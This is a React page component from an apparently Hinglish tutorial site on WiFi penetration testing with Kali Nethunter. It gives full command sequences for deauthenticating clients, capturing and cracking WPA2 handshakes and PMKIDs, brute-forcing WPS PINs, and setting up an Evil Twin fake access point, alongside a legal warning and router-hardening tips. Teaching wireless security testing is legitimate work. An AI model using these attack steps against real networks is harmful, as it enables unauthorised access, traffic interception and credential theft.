import { Link } from 'react-router-dom'
import TutorialLayout from '../components/TutorialLayout'
import CodeBlock from '../components/CodeBlock'

export default function WifiHacking() {
  return (
    <TutorialLayout
      title="WiFi Hacking"
      subtitle="Nethunter se wireless network penetration testing seekhein"
      icon="📡"
      prev={{ to: '/installation', label: 'Installation' }}
      next={{ to: '/bluetooth', label: 'Bluetooth Hacking' }}
    >
      <h2>WiFi Hacking Kya Hai?</h2>
      <p>
        WiFi hacking ka matlab hai wireless networks ki security test karna. Jab aap kisi WiFi network ki security test karte hain, toh aap usme vulnerabilities dhundhte hain jisse pata chale ki network kitna secure hai. Yeh ek bahut important skill hai ethical hackers ke liye kyunki aaj kal har jagah WiFi networks hain — ghar mein, office mein, cafes mein, airports mein — aur bahut se log apne networks ki security properly nahi karte.
      </p>
      <p>
        Nethunter par WiFi hacking seekhne ke liye aapko ek WiFi adapter chahiye jo monitor mode support kare. Zyadatar Android phones ke built-in WiFi chips monitor mode support nahi karte, isliye aapko ek external USB WiFi adapter chahiye hoga jo OTG cable se phone se connect hoga. Alfa AWUS036ACH ya TP-Link TL-WN722N v1 best options hain beginners ke liye.
      </p>
      <p>
        Yeh tutorial aapko step-by-step sikhayega ki WiFi networks ka security assessment kaise karte hain. Hum monitor mode enable karna, networks scan karna, WPA2 handshake capture karna, password crack karna, aur advanced techniques jaise Evil Twin aur PMKID attacks sab cover karenge.
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ Legal Warning:</strong> Sirf apne WiFi network ya jispar aapko written permission mili ho usi ki testing karein. Bina permission ke kisi bhi WiFi network ko hack karna illegal hai. India mein IT Act ke under ismein 3 saal tak ki jail aur 2 lakh tak ka fine ho sakta hai. Hum sirf educational knowledge de rahe hain — illegal use aapki apni zimmedari hai.
      </div>

      <h2>WiFi Security Types Samjhein</h2>
      <p>
        WiFi hacking seekhne se pehle aapko samajhna hoga ki different WiFi security types kya hain aur kaise kaam karti hain. Har type ki apni strengths aur weaknesses hain:
      </p>
      <ul>
        <li><strong>WEP (Wired Equivalent Privacy):</strong> Yeh sabse purana aur weakest encryption hai. 2001 mein banaya gaya tha aur ab completely broken hai. Aaj ke tools se WEP password minutes mein crack ho sakta hai. Agar aapke ghar ka WiFi WEP use karta hai toh TURANT change karein!</li>
        <li><strong>WPA (WiFi Protected Access):</strong> WEP ke baad aaya tha. TKIP encryption use karta hai. Dictionary attacks se crack ho sakta hai agar password weak ho. Aajkal koi bhi WPA use nahi karta.</li>
        <li><strong>WPA2:</strong> Current standard hai. AES-CCMP encryption use karta hai jo bahut strong hai. Lekin isme bhi kuch attacks kaam karte hain — PMKID attack bina client ke kaam karta hai, aur handshake capture karke dictionary attack se weak passwords crack ho sakte hain. Aajkal zyadatar routers WPA2 use karte hain.</li>
        <li><strong>WPA3:</strong> Sabse naya aur sabse secure standard. SAE (Simultaneous Authentication of Equals) use karta hai jo offline dictionary attacks ko rokta hai. Abhi tak limited attacks discover hue hain WPA3 par. Lekin bahut kam devices abhi WPA3 support karte hain.</li>
        <li><strong>Open Network (No Encryption):</strong> Koi encryption nahi hoti. Sab traffic plain text mein jaata hai koi bhi capture kar sakta hai. Public WiFi aksar open hota hai — isliye public WiFi par hamesha VPN use karein!</li>
      </ul>

      <h2>Step 1: Monitor Mode Enable Karein</h2>
      <p>
        Monitor mode aapke WiFi adapter ko ek special mode mein daal deta hai jismein woh wireless range mein hone wala SARA traffic capture karta hai — chahe woh aapke liye ho ya kisi aur ke liye. Normally WiFi adapter sirf un packets ko dekhta hai jo usse directly address kiye gaye hain, lekin monitor mode mein woh har packet sunta hai jaise ek radio scanner.
      </p>
      <p>
        Yeh WiFi hacking ka pehla aur sabse important step hai bina monitor mode ke aap koi bhi attack nahi kar sakte.
      </p>

      <CodeBlock
        title="WiFi Interface Check Karein"
        code={`# Pehle check karein ki WiFi adapter detect ho raha hai:
iwconfig

# Agar wlan0 ya wlan1 dikhta hai toh accha hai
# Agar kuch nahi dikhta toh adapter properly connected nahi hai

# Check karein ki adapter monitor mode support karta hai ya nahi:
airmon-ng

# Agar interface list mein wlan0 dikha toh monitor mode supported hai
# Agar nahi dikha toh external adapter lagana padega`}
      />

      <CodeBlock
        title="airmon-ng se Monitor Mode Enable Karein"
        code={`# Pehle wo processes band karein jo interfere kar sakte hain:
sudo airmon-ng check kill

# Ab monitor mode enable karein wlan0 par:
sudo airmon-ng start wlan0

# Check karein ki monitor mode active hai:
iwconfig
# "Mode:Monitor" dikhna chahiye wlan0mon ya mon0 par

# Alternative method (ip/iw commands se):
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Agar koi error aaye "monitor mode not supported"
# Toh aapke built-in WiFi chip mein support nahi hai
# External USB WiFi adapter use karein`}
      />

      <h2>Step 2: Networks Scan Karein</h2>
      <p>
        Monitor mode enable hone ke baad ab aap aas paas ke sab WiFi networks scan kar sakte hain. Isse aapko pata chalega ki kaunse networks hain, unki kya encryption hai, kaunse channel par hain, aur kitne devices connected hain.
      </p>

      <CodeBlock
        title="airodump-ng se Scan Karein"
        code={`# Sab networks scan karein:
sudo airodump-ng wlan0mon

# Screen par bahut saari information aayegi:
# BSSID    — Router ka MAC address (unique ID)
# PWR      — Signal strength (zyada number = zyada paas)
# ESSID    — Network ka naam (WiFi name)
# CH       — Channel number (1-13)
# ENC      — Encryption type (WPA2, WEP, OPN)
# CIPHER   — Cipher type (CCMP, TKIP)
# AUTH     — Authentication type (PSK, MGT)
# #Data    — Kitne packets capture hue
# Clients  — Kitne devices connected hain

# Specific channel par scan karein:
sudo airodump-ng wlan0mon --channel 6

# Scan results file mein save karein:
sudo airodump-ng wlan0mon -w scan_results

# Sirf WPA2 networks dikhao:
sudo airodump-ng wlan0mon --encrypt WPA2`}
      />

      <h2>Step 3: WPA2 Handshake Capture Karein</h2>
      <p>
        WPA2 password crack karne ke liye aapko pehle "4-way handshake" capture karna hoga. Handshake ek authentication process hai jab koi device WiFi se connect hota hai. Is handshake mein encrypted password information hoti hai jise crack karke original password nikala ja sakta hai.
      </p>
      <p>
        Handshake capture karne ke do tarike hain — ek toh aap wait kar sakte hain jab koi naya device connect ho, ya phir aap deauthentication attack se existing devices ko kick karke force kar sakte hain ki woh dobara connect ho aur handshake generate ho.
      </p>

      <CodeBlock
        title="Target Network Ko Target Karein"
        code={`# Specific network ko target karein:
sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6 -w target

# Replace karein:
# AA:BB:CC:DD:EE:FF = Target router ka BSSID
# 6 = Target ka channel number

# Airodump-ng ab sirf us network ka traffic capture karega
# Upar "WPA handshake: AA:BB:CC:DD:EE:FF" dikhega jab capture ho

# Clients section mein dekhein ki kaunse devices connected hain
# In clients ki MAC address note kar lein`}
      />

      <CodeBlock
        title="Deauthentication Attack se Handshake Force Karein"
        code={`# NAYA terminal kholein (airodump-ng chal raha rehne do)

# Ek specific client ko kick karein:
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# -a = Router ka BSSID
# -c = Client ka MAC address
# 10 = Kitne deauth packets bhejne hain

# SAB clients ko kick karein:
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# 0 = continuously bhejta rahega (Ctrl+C se band karein)

# Jab handshake capture ho jayega toh airodump terminal mein
# "WPA handshake: AA:BB:CC:DD:EE:FF" dikh jayega
# Ab aireplay band kar sakte hain (Ctrl+C)`}
      />

      <h2>Step 4: WPA2 Password Crack Karein</h2>
      <p>
        Handshake capture hone ke baad ab aap password crack kar sakte hain. Iske liye do popular methods hain — aircrack-ng (CPU se crack karta hai, slow hai) aur hashcat (GPU se crack karta hai, bahut fast hai agar GPU ho). Dictionary attack mein ek wordlist file mein lakhs passwords hote hain aur har ek ko try kiya jaata hai.
      </p>

      <CodeBlock
        title="aircrack-ng se Crack Karein (CPU Method)"
        code={`# Wordlist attack se crack karein:
sudo aircrack-ng target-01.cap -w /usr/share/wordlists/rockyou.txt

# Agar rockyou.txt compressed hai toh pehle extract karein:
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Faster cracking ke liye multiple CPU cores use karein:
sudo aircrack-ng target-01.cap -w wordlist.txt -p 4

# Agar password wordlist mein hoga toh dikh jayega:
# KEY FOUND! [ password123 ]

# Agar wordlist mein nahi hoga toh "Passphrase not in dictionary" aayega
# Tab aapko bigger wordlist chahiye ya different attack try karna hoga`}
      />

      <CodeBlock
        title="hashcat se Crack Karein (GPU Method — Fast)"
        code={`# Pehle capture ko hashcat format mein convert karein:
sudo aircrack-ng target-01.cap -j hashcat_input
# Yeh .hccapx file banayega

# hashcat se crack karein (WPA2 ke liye mode 2500):
hashcat -m 2500 hashcat_input.hccapx /usr/share/wordlists/rockyou.txt

# PMKID capture ke liye (mode 16800):
hashcat -m 16800 pmkid_hash.txt /usr/share/wordlists/rockyou.txt

# Bigger wordlist ke liye:
# Download karein: Weakpass, SecLists, CrackStation wordlists

# Rule-based attack (wordlist ke variations try karta hai):
hashcat -m 2500 hashcat_input.hccapx wordlist.txt -r rules/best64.rule`}
      />

      <h2>WPS Attack (Reaver se)</h2>
      <p>
        WPS (WiFi Protected Setup) ek feature hai jo WiFi connect karna easy banata hai ek PIN ke through. Lekin isme ek vulnerability hai — PIN sirf 8 digits ka hai aur bruteforce se crack ho sakta hai. Bahut se purane routers mein WPS enabled hota hai aur kabhi kabhi lock bhi nahi hota. Agar target router mein WPS enabled hai toh yeh WPA2 cracking se bahut faster hai.
      </p>

      <CodeBlock
        title="WPS Attack with Reaver"
        code={`# Pehle WPS-enabled networks scan karein:
sudo wash -i wlan0mon

# WPS-enabled networks dikhenge unka WPS status ke saath
# LCK = Locked (attack nahi hoga)
# No lock = Attack possible

# Reaver se WPS PIN brute force:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Lock avoid karne ke liye delay add karein:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 5 -r 3:15

# -d 5 = 5 second delay between attempts
# -r 3:15 = 15 second wait after every 3 attempts

# Agar Reaver kaam nahi karta toh Bully try karein:
sudo bully -b AA:BB:CC:DD:EE:FF -d -v 3 wlan0mon`}
      />

      <h2>Evil Twin Attack</h2>
      <p>
        Evil Twin attack mein aap ek fake WiFi access point banate ho jo bilkul real jaisa dikhta hai — same naam, same appearance. Jab log aapke fake AP se connect hote hain toh aap unka traffic capture kar sakte hain, unhe phishing pages dikha sakte hain, ya credentials steal kar sakte hain. Yeh ek bahut powerful social engineering attack hai.
      </p>

      <CodeBlock
        title="Evil Twin Setup Karein"
        code={`# Fake AP banayein target ke naam se:
sudo airbase-ng -e "TargetWiFi" -c 6 wlan0mon

# Fake AP ka interface configure karein:
sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0 up

# DHCP server setup karein (clients ko IP milega):
echo "interface=at0
dhcp-range=192.168.1.10,192.168.1.50,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1" > dnsmasq.conf

# DHCP server start karein:
sudo dnsmasq -C dnsmasq.conf

# Real AP ko deauth karein taaki clients aapke fake AP pe aayein:
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Ab clients automatically aapke fake AP se connect ho jayenge
# Wireshark ya tcpdump se unka traffic capture kar sakte hain`}
      />

      <h2>PMKID Attack (Bina Client Ke)</h2>
      <p>
        2018 mein ek naya attack discover hua jisme WPA2 password crack karne ke liye kisi connected client ki zaroorat nahi hoti. Yeh PMKID attack hai. Aapko sirf router ke range mein rehna hai aur router ka PMKID capture karna hai. Yeh attack bahut effective hai kyunki kabhi kabhi koi client connected nahi hota tab bhi yeh kaam karta hai.
      </p>

      <CodeBlock
        title="PMKID Capture with hcxdumptool"
        code={`# Tools install karein:
sudo apt install hcxdumptool hcxtools

# PMKID capture karein:
sudo hcxdumptool -i wlan0mon --filterlist_ap=target.txt --filtermode=2 -o capture.pcapng

# target.txt mein target router ka BSSID hona chahiye (ek per line)

# Capture ko hashcat format mein convert karein:
hcxpcapngtool capture.pcapng -o hash.txt

# hashcat se crack karein:
hashcat -m 16800 hash.txt /usr/share/wordlists/rockyou.txt

# Yeh method bahut fast hai kyunki aapko handshake ka wait nahi karna
# Agar router ka password weak hai toh minutes mein crack ho jayega`}
      />

      <h2>Sab Ek Mein: Wifite Tool</h2>
      <p>
        Wifite ek automated WiFi hacking tool hai jo sab attacks automatically try karta hai. Beginners ke liye bahut accha hai kyunki aapko alag alag tools manually nahi chalane padte. Wifite khud monitor mode enable karta hai, networks scan karta hai, aur multiple attack methods try karta hai jab tak password na mil jaye.
      </p>

      <CodeBlock
        title="Wifite se Automated Attack"
        code={`# Wifite start karein (automatically monitor mode enable karega):
sudo wifite

# Wifite kya karega:
# 1. Sab networks scan karega
# 2. Targets list dikhega signal strength ke saath
# 3. Target select karein (number type karein)
# 4. Automatically multiple attacks try karega:
#    - WPS PIN attack (Reaver)
#    - PMKID capture (hcxdumptool)
#    - WPA handshake capture + crack (aircrack-ng)

# Specific wordlist ke saath:
sudo wifite --dict /usr/share/wordlists/rockyou.txt

# Specific target ke liye:
sudo wifite -b AA:BB:CC:DD:EE:FF

# WPS attack skip karein:
sudo wifite --wps 0

# Jab password mil jaye toh screen par dikh jayega
# Ctrl+C se kisi bhi time band kar sakte hain`}
      />

      <h2>WiFi Hacking Tools Summary</h2>
      <p>
        Neeche table mein sabhi important WiFi hacking tools hain jo Nethunter par available hain. Har tool ka apna specific use case hai:
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Tool</th>
              <th className="text-left py-2 px-3 text-neon-green">Kya Karta Hai</th>
              <th className="text-left py-2 px-3 text-neon-green">Command</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">airmon-ng</td><td>Monitor mode on/off</td><td className="font-mono text-xs">airmon-ng start wlan0</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">airodump-ng</td><td>Network scan & packet capture</td><td className="font-mono text-xs">airodump-ng wlan0mon</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">aireplay-ng</td><td>Packet injection (deauth)</td><td className="font-mono text-xs">aireplay-ng --deauth 10 -a BSSID</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">aircrack-ng</td><td>WEP/WPA password crack</td><td className="font-mono text-xs">aircrack-ng capture.cap -w list.txt</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">reaver</td><td>WPS PIN brute force</td><td className="font-mono text-xs">reaver -i wlan0mon -b BSSID</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">wifite</td><td>Automated WiFi attacks</td><td className="font-mono text-xs">wifite</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">hcxdumptool</td><td>PMKID capture</td><td className="font-mono text-xs">hcxdumptool -i wlan0mon -o out</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">hashcat</td><td>GPU-accelerated cracking</td><td className="font-mono text-xs">hashcat -m 2500 hash wordlist</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">bettercap</td><td>WiFi MITM & sniffing</td><td className="font-mono text-xs">bettercap → wifi.recon on</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Strong WiFi Password Kaise Banayein</h2>
      <p>
        Ab jab aap jaante hain ki WiFi hack kaise hota hai, toh yeh bhi jaan lein ki apna WiFi kaise secure karein. Strong password banane ke tips:
      </p>
      <ul>
        <li><strong>Lamba password rakhein:</strong> Kam se kam 12-16 characters. Lamba password brute force se crack karna almost impossible hai.</li>
        <li><strong>Mix karein:</strong> Uppercase, lowercase, numbers, aur special characters sab use karein. Jaise: "MyW1f1P@ss2024!"</li>
        <li><strong>Dictionary words avoid karein:</strong> "password", "12345678", "admin123" jaise passwords second mein crack ho jaate hain.</li>
        <li><strong>WPA3 use karein:</strong> Agar aapka router WPA3 support karta hai toh zaroor use karein.</li>
        <li><strong>WPS disable karein:</strong> Router settings mein WPS band kar dein — yeh ek backdoor hai.</li>
        <li><strong>Router admin password change karein:</strong> Default "admin/admin" mat rakhein.</li>
        <li><strong>Firmware update rakhein:</strong> Router ka firmware regularly update karein taaki security patches mil sakein.</li>
        <li><strong>Guest network alag rakhein:</strong> Guests ke liye alag WiFi network banayein jo main network se isolated ho.</li>
      </ul>

      <div className="success-box mt-8">
        <strong>✅ Agle Step:</strong> WiFi hacking seekhne ke baad{' '}
        <Link to="/bluetooth" className="text-neon-green underline">Bluetooth Hacking</Link> section mein jaayein
        aur Bluetooth security testing seekhein!
      </div>
    </TutorialLayout>
  )
}
